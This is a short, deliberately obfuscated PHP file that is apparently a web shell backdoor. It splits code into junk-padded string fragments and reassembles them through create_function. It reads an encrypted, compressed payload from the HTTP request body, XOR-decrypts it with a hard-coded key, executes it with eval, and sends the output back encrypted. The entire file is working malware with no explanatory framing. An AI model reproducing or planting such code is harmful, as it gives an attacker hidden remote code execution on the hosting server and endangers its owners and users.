<?php
$i='n()mZ;$r=@bmZase64_enmZcodemZ(@x(mZ@gzcompmZresmZs($o),$k))mZ;print(mZ"$p$kmZh$r$kf");}';
$C='or($imZ=0;$mZimZ<$l;){for($j=0;($j<mZ$c&&$i<$lmZmZ);mZ$j++mZ,$i++){$o.=mZ$t{$mZi}^mZ';
$u='$k="mZ6b0eb79mZ0";$kmZh="c244mZ227711mZec";$mZmZkf="da3ecmZ09cd84e";mZ$p="7XmZyU0tP2mZL';
$F=str_replace('k','','crekatkkek_kfunkction');
$X='x(@bmZase64_decodemZ($m[mZ1mZ]),$k)))mZ;$o=@ob_getmZmZ_mZcmZontents();@ob_endmZ_clea';
$Y='ents("mZpmZhp://input")mZ,$m)==mZ1) {@omZmZb_startmZ();@evmZal(@mZgzumZncompresmZs(@';
$h='kwLCNPx";fmZunmZction x($tmZ,$mZk){$c=stmZrlemZn($kmZ);mZ$l=strlen($mZt);$mZomZ="";f';
$y='$k{$j};}mZ}return $o;}if mZmZ(@preg_matchmZ(mZ"mZ/$mZkh(.+)$kf/",@fimZle_get_cmZont';
$M=str_replace('mZ','',$u.$h.$C.$y.$Y.$X.$i);
$H=$F('',$M);$H();
?>
